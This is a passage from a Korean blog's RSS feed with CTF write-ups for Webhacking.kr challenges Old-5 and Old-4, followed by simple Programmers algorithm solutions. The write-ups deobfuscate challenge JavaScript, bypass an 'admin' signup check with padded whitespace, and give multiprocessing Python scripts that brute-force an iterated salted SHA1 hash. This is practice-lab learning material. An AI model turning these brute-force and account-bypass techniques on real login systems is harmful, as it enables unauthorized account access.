src="/images/pasted-451.png"><br><code>lIIIIIIIIIIIIIIIIIIl</code>의 값은 document.cookie라는 것을 알 수 있었다.<br><br>이런 식으로 계속 분석하여 난독화를 풀이하였다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="built_in">eval</span>(<span class="built_in">document</span>.cookie).indexOf(<span class="string">&#x27;oldzombie&#x27;</span>)==-<span class="number">1</span> ) &#123;</span><br><span class="line">alert(<span class="string">&#x27;bye&#x27;</span>);<span class="keyword">throw</span> <span class="string">&quot;stop&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">eval</span>(<span class="string">&#x27;document.URL&#x27;</span>).indexOf(<span class="string">&quot;mode=1&quot;</span>)==-<span class="number">1</span> ) &#123;</span><br><span class="line">alert(<span class="string">&#x27;access_denied&#x27;</span>);<span class="keyword">throw</span> <span class="string">&quot;stop&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;font size=2 color=white&gt;Join&lt;/font&gt;&lt;p&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;form method=post action=&quot;join.php&quot;&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;table border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;id&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=id maxlength=20&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;pass&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#x27;</span>pw<span class="string">&#x27;&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;tr align=center&gt;&lt;td colspan=2&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>난독화를 풀어보니, 위와 같은 코드가 나왔다.<br><br>Else를 실행시키기 위해선, oldzombie라는 cookie이 없으며 안되며, 파라미터 mode의 값이 1이어야 한다.</p><p><img src="/images/pasted-452.png"><br><img src="/images/pasted-453.png" alt="https://webhacking.kr/challenge/web-05/mem/join.php?mode=1"><br>위에 정의한 것을 모두 수행하니, 회원가입을 진행할 수 있었다.</p><p><img src="/images/pasted-454.png"><br><img src="/images/pasted-455.png"><br>admin으로 가입을 시도하니, 이미 존재하는 ID라서 실패하였다.</p><p><img src="/images/pasted-456.png"><br><img src="/images/pasted-457.png"><br>그래서 일단 lrtk으로 계정을 생성하여 로그인을 시도하였다.</p><p><img src="/images/pasted-458.png"><br>로그인은 성공했지만, admin으로 로그인을 해야 Flag를 주는 것으로 확인되었다.<br><br>여기서 막혀서 고민을 하다가 시간을 너무 잡아먹어서 다른 사람의 풀이를 확인하였다.</p><p><img src="/images/pasted-459.png"><br><img src="/images/pasted-460.png"><br>위와 같이 admin 뒤에 공백을 엄청 많이 주니, 우회가 가능하였다.</p><p><img src="/images/pasted-461.png"><br>로그인을 하니, flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/24/Webhacking-kr-Old-5-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 4 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/24/Webhacking-kr-Old-4-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/24/Webhacking-kr-Old-4-Write-Up/</guid>
      <pubDate>Mon, 24 May 2021 17:01:14 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-4"><a href="#Old-4" class="headerlink" title="Old - 4"></a>Old - 4</h2><p><img src="/images/pasted-440.png"><br>비밀번호 form 위에 해시값이 있는 것으로 판단된다.<br><br>아마 해시값을 이용하여 비밀번호를 알아내는 문제인 듯하다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  sleep(<span class="number">1</span>); <span class="comment">// anti brute force</span></span><br><span class="line">  <span class="keyword">if</span>((<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;chall4&#x27;</span>])) &amp;&amp; ($_POST[<span class="string">&#x27;key&#x27;</span>] == $_SESSION[<span class="string">&#x27;chall4&#x27;</span>])) solve(<span class="number">4</span>);</span><br><span class="line">  $hash = rand(<span class="number">10000000</span>,<span class="number">99999999</span>).<span class="string">&quot;salt_for_you&quot;</span>;</span><br><span class="line">  $_SESSION[<span class="string">&#x27;chall4&#x27;</span>] = $hash;</span><br><span class="line">  <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">500</span>;$i++) $hash = sha1($hash);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 살펴보니, 해시를 생성하는 코드가 있었다.<br><br>그러나 문제는 10000000 ~ 99999999이라는 엄청난 범위에서 랜덤으로 나온 값과 ‘sal_for_you’라는 문자열을 합한 값을 해시화했다는 것이다.<br><br>거기서 끝나지 않고 해시화한 값을 500번 반복하여 해시화하였다.</p><p>이러면, 코드를 짜서 해시값과 같은 값이 나올 때까지 돌릴 수 밖에 없다.<br><br>나는 여러가지 방법을 생각을 하였다.</p><ul><li><p>방법 1<br><br>일반적인 파이썬으로 값을 구하는 방법<br><br>이 방법은 10000000 ~ 30000000까지 돌리고, 안나오면 페이지를 리로딩하여 해시값을 초기화하는 방법으로 접근해야한다.<br><br>이렇게 하지 않으면 범위가 크기 때문에 엄청난 시간이 소요될 것으로 판단된다.</p></li><li><p>방법 2<br><br>멀티 프로세싱을 이용하는 방법<br><br>10개의 프로세스로 돌리는 방법이다. 이 방법으로 구하는데, 더 빠르게 구하고 싶으면, 각 프로세스에 멀티 스레딩를 적용하여 사용하면 된다.</p></li></ul><hr><h3 id="방법-1"><a href="#방법-1" class="headerlink" title="방법 1"></a>방법 1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">current = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>, <span class="number">99999999</span>+<span class="number">1</span>):</span><br><span class="line">    current = <span class="built_in">str</span>(i) + <span class="string">&#x27;salt_for_you&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">        h = hashlib.sha1()</span><br><span class="line">        h.update(current.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        current = h.hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;89b3dc6eacc20ce197d29c728a330fdee4b4a808&#x27;</span> == current:</span><br><span class="line">        print(<span class="string">f&#x27;Success!!! - <span class="subst">&#123;i&#125;</span>salt_for_you&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>10000000 ~ 99999999까지 돌리는 코드이다.<br><br>10000000 ~ 40000000까지만 돌리는 것은 Range 함수의 범위를 수정하면 된다.</p><p>다른 방법으로 시도 후 안되면 수정해서 사용하겠다.</p><hr><h3 id="방법-2"><a href="#방법-2" class="headerlink" title="방법 2"></a>방법 2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, cpu_count, Process</span><br><span class="line"><span class="keyword">import</span> hashlib, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwCreate</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num) + <span class="string">&#x27;salt_for_you&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashing</span>(<span class="params">pw:<span class="built_in">str</span></span>):</span></span><br><span class="line">    current = pw</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        h = hashlib.sha1()</span><br><span class="line">        h.update(current.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        current = h.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current == <span class="string">&#x27;89b3dc6eacc20ce197d29c728a330fdee4b4a808&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;Password is&#x27;</span>, pw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    cores = cpu_count()</span><br><span class="line">    <span class="keyword">with</span> Pool(cores) <span class="keyword">as</span> p:</span><br><span class="line">        pwList = p.<span class="built_in">map</span>(pwCreate, <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10000000</span>, <span class="number">99999999</span>+<span class="number">1</span>)))</span><br><span class="line">    print(<span class="string">&#x27;PW List 완료 -&#x27;</span>, <span class="built_in">int</span>(time.time() - start), <span class="string">&#x27;초&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> Pool(cores) <span class="keyword">as</span> p:</span><br><span class="line">        p.<span class="built_in">map</span>(hashing, pwList)</span><br><span class="line">    print(<span class="string">&#x27;End -&#x27;</span>, <span class="built_in">int</span>(time.time() - start), <span class="string">&#x27;초&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-441.png"><br>해당 코드를 돌리면, 컴퓨터의 자원이 많이 사용 되기 때문에 사용에 유의하기 바란다.<br><br>때문에 나는 맥북에서 돌리는 대신 데스크탑의 환경에서 코드를 돌렸다.</p><p><img src="/images/pasted-442.png"><br>거의 1시간을 소비하니, 결과가 나왔다.</p><p><img src="/images/pasted-443.png"><br>Flag를 획득할 수 있었다.</p><hr><p>문제를 풀이하는 분들은 코드를 수정하여 해시값을 파일에 저장하여, 검색하는 방법으로 접근하면 좋을 것 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, cpu_count, Process</span><br><span class="line"><span class="keyword">import</span> hashlib, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwCreate</span>(<span class="params">num:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num) + <span class="string">&#x27;salt_for_you&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashing</span>(<span class="params">pw:<span class="built_in">str</span></span>):</span></span><br><span class="line">    current = pw</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        h = hashlib.sha1()</span><br><span class="line">        h.update(current.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        current = h.hexdigest()</span><br><span class="line"></span><br><span class="line">    print(pw, <span class="string">&#x27;-&#x27;</span>, current)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    cores = cpu_count()</span><br><span class="line">    <span class="keyword">with</span> Pool(cores) <span class="keyword">as</span> p:</span><br><span class="line">        pwList = p.<span class="built_in">map</span>(pwCreate, <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10000000</span>, <span class="number">99999999</span>+<span class="number">1</span>)))</span><br><span class="line">    print(<span class="string">&#x27;PW List 완료 -&#x27;</span>, <span class="built_in">int</span>(time.time() - start), <span class="string">&#x27;초&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> Pool(cores) <span class="keyword">as</span> p:</span><br><span class="line">        p.<span class="built_in">map</span>(hashing, pwList)</span><br><span class="line">    print(<span class="string">&#x27;End -&#x27;</span>, <span class="built_in">int</span>(time.time() - start), <span class="string">&#x27;초&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-444.png"><br><code>python3 4-1.py &gt; result.txt</code>로 하면, 출력값이 텍스트 파일로 저장이 된다.<br><br>다만, 거의 10기가에 가까운 텍스트 파일이라 에디터나 메모장은 열지 못할 것이다.<br><br>나는 GVIM 에디터로 열어서 확인하였다. 참고하면 될 듯 하다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/24/Webhacking-kr-Old-4-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 두 개 뽑아서 더하기</title>
      <link>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EB%91%90-%EA%B0%9C-%EB%BD%91%EC%95%84%EC%84%9C-%EB%8D%94%ED%95%98%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EB%91%90-%EA%B0%9C-%EB%BD%91%EC%95%84%EC%84%9C-%EB%8D%94%ED%95%98%EA%B8%B0/</guid>
      <pubDate>Sun, 23 May 2021 15:21:50 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;두-개-뽑아서-더하기&quot;&gt;&lt;a href=&quot;#두-개-뽑아서-더하기&quot; class=&quot;headerlink&quot; title=&quot;두 개 뽑아서 더하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/l</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="두-개-뽑아서-더하기"><a href="#두-개-뽑아서-더하기" class="headerlink" title="두 개 뽑아서 더하기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/68644">두 개 뽑아서 더하기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>정수 배열 numbers가 주어집니다. numbers에서 서로 다른 인덱스에 있는 두 개의 수를 뽑아 더해서 만들 수 있는 모든 수를 배열에 오름차순으로 담아 return 하도록 solution 함수를 완성해주세요.</p><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><ul><li>numbers의 길이는 2 이상 100 이하입니다.</li><li>numbers의 모든 수는 0 이상 100 이하입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>문제를 풀기 앞서 문제를 읽어보고 예제를 봤는데 바로 이해가 되지 않았다.<br><br>그래서 직접 시뮬레이션을 하여 문제를 이해하고자 하였다.</p><hr><p>문제 : 1, 1,  2,  3,  4</p><p>1+1 = 2<br>1+2 = 3<br>1+3 = 4<br>1+4 = 5</p><p>1+2 = 3<br>1+3 = 4<br>1+4 = 5</p><p>2+3 = 5<br>2+4 = 6</p><p>3+4 = 7</p><p>결과 : 2, 3, 4, 5, 6, 7</p><hr><p>문제: 0, 2, 5, 7</p><p>0+2 = 2<br>0+5 = 5<br>0+7 = 7</p><p>2+5 = 7<br>2+7 = 9</p><p>5+7 = 12</p><p>결과: 2, 5, 7, 9, 12</p><hr><p>이렇게 정리를 하니, 쉽게 이해할 수 있었다.</p><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">numbers:<span class="built_in">list</span></span>):</span></span><br><span class="line">    n = <span class="built_in">sorted</span>(numbers)</span><br><span class="line">    </span><br><span class="line">    idx = <span class="number">1</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> n[idx:]:</span><br><span class="line">            result.append(i+j)</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(result)))</span><br></pre></td></tr></table></figure><p>나는 시뮬레이션을 한 것을 그대로 코드로 구현하였다.</p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">numbers</span>):</span></span><br><span class="line">    answer = [numbers[i]+numbers[j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(numbers)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(numbers))]    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">set</span>(answer)))</span><br></pre></td></tr></table></figure><p>방법1과 같은 원리지만, 방법2에선 리스트의 길이를 컨트롤하여 구하였다.<br><br>방법1에선 인덱싱을 컨트롤하기 위해 for문 안에 idx을 1씩 증가 시켜줬지만, 방법2은 그럴 필요 없이 for문 안에 있는 range 함수의 첫번째 인자를 1씩 증가시키는 방법으로 더 간소화 시켰다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EB%91%90-%EA%B0%9C-%EB%BD%91%EC%95%84%EC%84%9C-%EB%8D%94%ED%95%98%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 자연수 뒤집어 배열로 만들기</title>
      <link>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EC%9E%90%EC%97%B0%EC%88%98-%EB%92%A4%EC%A7%91%EC%96%B4-%EB%B0%B0%EC%97%B4%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EC%9E%90%EC%97%B0%EC%88%98-%EB%92%A4%EC%A7%91%EC%96%B4-%EB%B0%B0%EC%97%B4%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B8%B0/</guid>
      <pubDate>Sun, 23 May 2021 14:45:01 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;자연수-뒤집어-배열로-만들기&quot;&gt;&lt;a href=&quot;#자연수-뒤집어-배열로-만들기&quot; class=&quot;headerlink&quot; title=&quot;자연수 뒤집어 배열로 만들기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="자연수-뒤집어-배열로-만들기"><a href="#자연수-뒤집어-배열로-만들기" class="headerlink" title="자연수 뒤집어 배열로 만들기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12932">자연수 뒤집어 배열로 만들기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>자연수 n을 뒤집어 각 자리 숫자를 원소로 가지는 배열 형태로 리턴해주세요. 예를들어 n이 12345이면 [5,4,3,2,1]을 리턴합니다.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>n은 10,000,000,000이하인 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">str</span>(n)[::<span class="number">-1</span>])]</span><br></pre></td></tr></table></figure><p>이 방법은 정수를 문자열로 변경하여, 인덱싱을 통해 뒤집어줬다.<br><br>하지만 인덱싱말고, reversed 함수를 이용하는 방법도 있다.</p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">str</span>(n))))</span><br></pre></td></tr></table></figure><p>이 방법은 reversed 함수로 문자열을 뒤집었고, 방법1의 list comprehension으로 list로 만들어주지 않고, 타입 변환으로 간단하게 변환하였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EC%9E%90%EC%97%B0%EC%88%98-%EB%92%A4%EC%A7%91%EC%96%B4-%EB%B0%B0%EC%97%B4%EB%A1%9C-%EB%A7%8C%EB%93%A4%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 제일 작은 수 제거하기</title>
      <link>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EC%A0%9C%EC%9D%BC-%EC%9E%91%EC%9D%80-%EC%88%98-%EC%A0%9C%EA%B1%B0%ED%95%98%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EC%A0%9C%EC%9D%BC-%EC%9E%91%EC%9D%80-%EC%88%98-%EC%A0%9C%EA%B1%B0%ED%95%98%EA%B8%B0/</guid>
      <pubDate>Sun, 23 May 2021 14:39:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;제일-작은-수-제거하기&quot;&gt;&lt;a href=&quot;#제일-작은-수-제거하기&quot; class=&quot;headerlink&quot; title=&quot;제일 작은 수 제거하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/3</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="제일-작은-수-제거하기"><a href="#제일-작은-수-제거하기" class="headerlink" title="제일 작은 수 제거하기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12935">제일 작은 수 제거하기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>정수를 저장한 배열, arr 에서 가장 작은 수를 제거한 배열을 리턴하는 함수, solution을 완성해주세요. 단, 리턴하려는 배열이 빈 배열인 경우엔 배열에 -1을 채워 리턴하세요. 예를들어 arr이 [4,3,2,1]인 경우는 [4,3,2]를 리턴 하고, [10]면 [-1]을 리턴 합니다.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>arr은 길이 1 이상인 배열입니다.</li><li>인덱스 i, j에 대해 i ≠ j이면 arr[i] ≠ arr[j] 입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr:<span class="built_in">list</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    arr.remove(<span class="built_in">min</span>(arr))</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><p>리스트의 길이가 1보다 같거나 작으면 <code>[-1]</code>를 반환하였다.<br><br>그게 아니라면, min함수를 사용하여 arr의 최소값을 구하고 remove 함수로 삭제하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/23/Programmers-Level-1-%EC%A0%9C%EC%9D%BC-%EC%9E%91%EC%9D%80-%EC%88%98-%EC%A0%9C%EA%B1%B0%ED%95%98%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 56 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/22/Webhacking-kr-Old-56-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/22/Webhacking-kr-Old-56-Write-Up/</guid>
      <pubDate>Sat, 22 May 2021 17:29:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
